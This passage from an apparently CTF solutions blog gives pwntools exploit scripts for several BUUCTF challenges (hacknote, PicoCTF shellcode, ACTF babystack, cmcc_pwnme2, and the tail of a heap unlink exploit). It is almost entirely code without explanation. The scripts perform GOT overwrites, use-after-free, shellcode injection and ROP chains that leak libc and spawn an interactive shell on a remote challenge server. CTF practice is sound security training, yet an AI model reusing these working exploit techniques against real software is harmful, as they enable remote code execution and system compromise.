class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(idx))</span><br><span class="line">sl(<span class="built_in">str</span>(size))</span><br><span class="line">sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">s_addr = <span class="number">0x0000000000602140</span></span><br><span class="line">lg(<span class="string">&#x27;atoi_got&#x27;</span>, atoi_got)</span><br><span class="line">lg(<span class="string">&#x27;puts_got&#x27;</span>, puts_got)</span><br><span class="line">lg(<span class="string">&#x27;puts_plt&#x27;</span>, puts_plt)</span><br><span class="line">lg(<span class="string">&#x27;free_got&#x27;</span>, free_got)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line"><span class="comment"># add(0x30)</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#4</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">payload+= p64(s_addr+<span class="number">0x10</span>-<span class="number">0x18</span>)+p64(s_addr+<span class="number">0x10</span>-<span class="number">0x10</span>)</span><br><span class="line">payload+= p64(<span class="number">0x20</span>)*<span class="number">2</span></span><br><span class="line">payload+= p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span> + p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">8</span>, p64(puts_plt))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">puts_addr = l64()</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] + (puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>, system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">8</span>, p64(system))</span><br><span class="line">sl(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-80-pwnable-hacknote-solve"><a href="#NO-80-pwnable-hacknote-solve" class="headerlink" title="NO.80 pwnable_hacknote_solve"></a>NO.80 pwnable_hacknote_solve</h1><h3 id="exp-80"><a href="#exp-80" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./pwnable_hacknote&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25229</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwnable_hacknote&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;size :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">puts_func_addr = <span class="number">0x0804862b</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(puts_func_addr)+p32(elf.got[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">read_addr = l32()</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = read_addr - libc.sym[&#x27;read&#x27;]</span></span><br><span class="line"><span class="comment"># system = libc.sym[&#x27;system&#x27;] + libc_base</span></span><br><span class="line">lg(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x8</span>, p32(system)+<span class="string">&#x27;;sh\x00&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-81-PicoCTF-2018-shellcode-solve"><a href="#NO-81-PicoCTF-2018-shellcode-solve" class="headerlink" title="NO.81 PicoCTF_2018_shellcode_solve"></a>NO.81 PicoCTF_2018_shellcode_solve</h1><h3 id="exp-81"><a href="#exp-81" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_shellcode&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27793</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-82-ACTF-2019-babystack-solve"><a href="#NO-82-ACTF-2019-babystack-solve" class="headerlink" title="NO.82 ACTF_2019_babystack_solve"></a>NO.82 ACTF_2019_babystack_solve</h1><h3 id="exp-82"><a href="#exp-82" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25461</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ACTF_2019_babystack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">o_g = [<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0xd0</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400ad3</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400A4E</span> </span><br><span class="line">ret = <span class="number">0x0000000000400709</span></span><br><span class="line">main = <span class="number">0x00000000004008F6</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;224&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">s_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment"># s_addr = l64()</span></span><br><span class="line">lg(<span class="string">&#x27;s_addr&#x27;</span>, s_addr)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+= p64(pop_rdi)</span><br><span class="line">payload+= p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload+= p64(main)</span><br><span class="line">payload+= <span class="string">b&quot;A&quot;</span> * (offset - <span class="number">8</span>*<span class="number">5</span>)</span><br><span class="line">payload+= p64(s_addr)+p64(leave_ret)</span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = l64()</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;224&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">s_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment"># s_addr = l64()</span></span><br><span class="line">lg(<span class="string">&#x27;s_addr&#x27;</span>, s_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+= p64(ret)</span><br><span class="line">payload+= p64(pop_rdi)</span><br><span class="line">payload+= p64(bin_sh)</span><br><span class="line">payload+= p64(system_addr)</span><br><span class="line">payload+= p64(main)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+= p64(s_addr)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">se(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-83-cmcc-pwnme2-solve"><a href="#NO-83-cmcc-pwnme2-solve" class="headerlink" title="NO.83 cmcc_pwnme2_solve"></a>NO.83 cmcc_pwnme2_solve</h1><h3 id="exp-83"><a href="#exp-83" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./cmcc_pwnme2&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26010</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;cmcc_pwnme2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_flag = <span class="number">0x08048682</span></span><br><span class="line">add_home = <span class="number">0x08048644</span></span><br><span class="line">string   = <span class="number">0x0804A060</span></span><br><span class="line">exec_str = <span class="number">0x080485CB</span></span><br><span class="line">pop_1    = <span class="number">0x08048680</span></span><br><span class="line">pop_2    = <span class="number">0x0804867f</span></span><br><span class="line">gets=elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>* (<span class="number">0x6c</span>+<span class="number">4</span>)+p32(gets)+p32(exec_str)+p32(string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*(0x6c+4) + p32(add_home)+p32(pop_1)+p32(0xDEADBEEF)</span></span><br><span class="line"><span class="comment"># payload+= p32(add_flag)+p32(pop_2)+p32(0xCAFEBABE)+p32(0xABADF00D)</span></span><br><span class="line"><span class="comment"># payload+= p32(exec_str)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-84-npuctf-2020-easyheap-solve"><a href="#NO-84-npuctf-2020-easyheap-solve" class="headerlink" title="NO.84 npuctf_2020_easyheap_solve"></a>NO.84 